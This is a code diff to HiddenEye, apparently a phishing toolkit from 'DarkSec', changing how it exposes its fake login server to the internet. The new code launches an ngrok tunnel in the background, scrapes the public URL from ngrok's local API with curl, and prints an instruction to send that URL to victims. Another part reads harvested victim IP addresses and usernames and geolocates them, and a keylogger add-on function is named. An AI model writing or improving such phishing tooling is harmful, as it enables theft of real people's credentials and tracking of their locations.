@@ -145,9 +145,18 @@ def selectServer(): #Question where user must select server
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
         {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ NGROK SERVER PROCEDURE ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2))
-            print(_("\n {1}[{0}!{1}]{0} THIS SCRIPT WILL TERMINATE AND NGROK WILL BE LAUNCHED.\n {1}[{0}!{1}]{0} SEND THOSE GENERATED NGROK URL TO VICTIM. \n {1}[{0}!{1}]{0} GET THE VICTIM DETAILS IN ({1}Server/www{0}) FOLDER IN HIDDENEYE DIRECTORY.   \n {1}[{0}+{1}]{0} PRESS ENTER TO LAUNCH NGROK SERVER.  \n").format(MAIN0, MAIN2, MAIN4))
-            input('')
-            system('./Server/ngrok http 1111')
+            
+            system('./Server/ngrok http 1111 > /dev/null &')
+            while True:
+                sleep(2)
+                system('curl -s -N http://127.0.0.1:4040/api/tunnels | grep "https://[0-9a-z]*\.ngrok.io" -oh > ngrok.url')
+                urlFile = open('ngrok.url', 'r')
+                url = urlFile.read()
+                urlFile.close()
+                if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:
+                    print(_("\n{0}[{1}!{0}]{1} SEND THIS NGROK URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:1111\n{0}[{1}*{0}]{1} NGROK URL: {2}".format(MAIN0, MAIN2, MAIN3) + url + "{1}").format(MAIN0, MAIN4, MAIN3))
+                    print("\n")  
+                    break
 
         elif choice == '2':
             system('clear')
@@ -498,8 +507,8 @@ def addkeylogger():
          sleep(2)
 
 def runServer():
-    system("fuser -k 1111/tcp")
-    system("cd Server/www/ && php -S 127.0.0.1:1111 > /dev/null &")
+    system("fuser -k 1111/tcp > /dev/null 2>&1")
+    system("cd Server/www/ && php -S 127.0.0.1:1111 > /dev/null 2>&1 &")
 
 
 
@@ -545,7 +554,7 @@ def getCredentials():
 
         with open('Server/www/ip.txt') as creds:
             lines = creds.read().rstrip()
-            if len(lines) != 0:	
+            if len(lines) != 0:
                 ip = re.match('Victim Public IP: (.*?)\n', lines).group(1)
                 user = re.match('Current logged in user: (a-z0-9)\n', lines)
                 resp = urlopen('https://ipinfo.io/{0}/json'.format(ip))
